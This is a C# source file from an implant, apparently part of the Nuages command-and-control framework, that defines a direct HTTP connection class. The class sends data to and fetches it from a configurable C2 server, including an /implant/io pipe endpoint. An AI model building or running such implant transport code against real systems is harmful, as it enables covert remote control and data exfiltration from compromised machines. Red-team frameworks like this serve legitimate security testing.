using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace NuagesSharpImplant
{
    public class DirectConnection : NuagesC2Connection
    {
        private string connectionString;

        private string handler = "Direct";

        public int refreshrate;

        public int buffersize;

        public DirectConnection(string connectionString, int buffersize, int refreshrate)
        {
            this.connectionString = connectionString;

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;

        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public bool supportsBinaryIO() {
            return true;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

        public void setRefreshRate(int refreshrate) {

            this.refreshrate = refreshrate;
       
        }

        public void setBufferSize(int buffersize) {

            this.buffersize = buffersize;
        
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        public string POST(string url, string body)
        {
            return Encoding.ASCII.GetString(POST(url, Encoding.ASCII.GetBytes(body)));
        }

        public byte[] POST(string url, byte[] body)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString + url);
            request.Method = "POST";

            request.ContentLength = body.Length;
            if (url.Length > 30)
            {
                // Our url is /implant/io/:pipeId/:maxSize
                request.ContentType = @"application/octet-stream";
            }
            else {
                request.ContentType = @"application/json";
            }

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(body, 0, body.Length);
            }
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    MemoryStream ms = new MemoryStream();
                    byte[] buffer = new byte[16384];
                    int bytesRead;
                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        ms.Write(buffer, 0, bytesRead);
                    }
                    byte[] b = ms.ToArray();
                    return b;
                }
            }
        }
    }

}
